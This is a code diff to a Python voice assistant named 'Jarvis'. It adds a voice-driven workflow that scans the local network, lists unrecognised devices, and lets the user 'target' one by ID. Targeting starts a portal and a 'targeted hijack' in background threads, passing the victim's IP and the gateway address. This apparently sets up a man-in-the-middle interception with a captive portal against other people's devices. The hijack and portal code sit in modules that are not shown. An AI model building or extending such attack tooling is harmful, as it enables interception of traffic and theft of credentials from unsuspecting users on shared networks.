@@ -1070,6 +1070,8 @@ import cv2
 from voice_auth import verify_voice
 import time
 from network_heatmap import show_network_heatmap
+from portal import start_portal
+from interrogator import start_targeted_hijack
 
 # ── Fast startup: MAC vendor DB load background mein ──
 try:
@@ -1570,17 +1572,61 @@ def jarvis_loop():
                 active = True
                 speak("Yes sir")
 
+            # -------- Inside jarvis_loop(while True) --------
+
             elif "scan network" in command:
-                speak("Scanning network sir")
-                devices     = scan_wifi_devices()
-                last_devices = devices
-                current_devices = set([mac for ip, mac, name, vendor in devices])
-                new_devices     = current_devices - previous_devices
-                for ip, mac, name, vendor in devices:
-                    if mac in new_devices:
-                        speak(f"New device detected {name}")
-                previous_devices = current_devices
+                speak("Scanning network sir. Filtering unknown devices.")
+                devices = scan_wifi_devices() 
+                
+                # Unknown devices ko global list mein save karein
+                global targetable_devices
+                targetable_devices = [d for d in devices if detect_brand(d[3]) == "Unknown Device"]
+                
+                if targetable_devices:
+                    speak(f"Sir, I found {len(targetable_devices)} unknown devices.")
+                    print("\n" + "ID".center(5) + "|" + "IP ADDRESS".center(20) + "|" + "MAC ADDRESS")
+                    print("-" * 50)
+                    
+                    for i, dev in enumerate(targetable_devices):
+                        # Index (0, 1, 2...) dikhayega selection ke liye
+                        print(f" {i} ".center(5) + "|" + f" {dev[0]} ".center(20) + "|" + dev[1])
+                    
+                    speak("Please select an ID to target. For example, say: Target zero or Target one.")
+                else:
+                    speak("No unknown devices detected, sir.")
+                
                 network_map(devices)
+
+            elif "target" in command:
+                # Command Example: "Jarvis, target zero" or "Jarvis, target 1"
+                try:
+                    # Voice command se number nikalna
+                    words = command.split()
+                    # "Target 1" mein se '1' nikalna
+                    selection_idx = int(words[words.index("target") + 1]) 
+                    
+                    if 0 <= selection_idx < len(targetable_devices):
+                        target_ip = targetable_devices[selection_idx][0] # IP fetch karna
+                        
+                        # Gateway/Local IP logic
+                        hostname = socket.gethostname()
+                        local_ip = socket.gethostbyname(hostname)
+                        gateway_ip = ".".join(local_ip.split('.')[:-1]) + ".1" 
+
+                        speak(f"Targeting ID {selection_idx} at IP {target_ip}.")
+                        
+                        # Background Threads Start Karein
+                        threading.Thread(target=start_portal, daemon=True).start()
+                        threading.Thread(
+                            target=start_targeted_hijack, 
+                            args=(target_ip, gateway_ip, local_ip, speaker), 
+                            daemon=True
+                        ).start()
+                    else:
+                        speak("Sir, that ID is not in the list.")
+                except Exception as e:
+                    print(f"Selection Error: {e}")
+                    speak("Sir, please provide a valid ID number from the list.")
             elif "heatmap" in command or "network map" in command:
                 if last_devices:
                     speak("Opening animated network heatmap sir")
